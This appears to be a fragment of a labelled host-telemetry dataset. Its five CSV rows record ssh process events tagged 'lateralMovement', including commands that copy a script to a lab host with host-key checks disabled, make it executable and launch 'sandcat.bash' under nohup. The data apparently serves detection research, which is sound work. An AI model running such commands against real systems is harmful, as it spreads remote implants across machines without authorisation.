+59fd9481258102acb3b649cdc7cd7a11,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152571.0,,syscall,152570.0,/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -l erfan2 -- 172.16.64.128 scp -t ~/Desktop,1701626485.167,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
+86e9c9bf7f6b786bf03eb30b58c10b5c,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152598.0,1701626511.882,syscall,152566.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
+a26390a44a4e9717c930e77d300e2cd5,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152598.0,,syscall,152566.0,ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup chmod u+x ./Desktop/sandcat.bash,1701626511.882,,,,,,,,,,,,,,,,,,1,lateralMovement,28360441
+2766fab1d748b6da6e8f33ca40a3c29f,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152612.0,1701626525.453,syscall,152566.0,,,,,,,,,,,,,,,,,,,,1,lateralMovement,28360442
+a08d65887c2473ce28c243387d8ab3b7,Process,,,1000.0,1000.0,/usr/bin/ssh,1000.0,1000.0,ssh,152612.0,,syscall,152566.0,ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 erfan2@172.16.64.128 nohup ./Desktop/sandcat.bash,1701626525.453,,,,,,,,,,,,,,,,,,1,lateralMovement,28360442
